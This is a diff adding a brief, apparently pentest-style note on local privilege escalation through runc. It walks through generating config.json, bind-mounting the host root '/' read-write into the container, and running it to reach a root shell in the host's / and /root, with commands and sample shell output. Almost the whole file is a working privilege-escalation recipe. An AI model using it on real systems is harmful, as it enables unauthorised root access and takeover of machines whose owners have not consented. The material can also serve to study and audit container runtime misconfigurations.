@@ -1,0 +1,24 @@
+# The runc container run time also installed on machine and anyone can run the runc command.
+
+step 1: run below command which will generate config.json file in your current directory
+[root@server1 ~]# runc spec
+
+step 2: now edit config.json and mount host / section in mount section as shown below
+
+{ 
+                        "type": "bind",
+                        "source": "/",
+                        "destination": "/",
+                        "options": ["rbind","rw","rprivate"]
+                
+                },
+
+step 3: now create rootfs file using belwo command
+[root@server1 ~]# mkdir rootfs
+
+step 4: now create demo conatiner using below commd 
+[root@server1 ~]# runc run demo
+below snippit shows that you are in host / directory and access anything as root
+sh-4.2# pwd
+/
+sh-4.2# cd /root
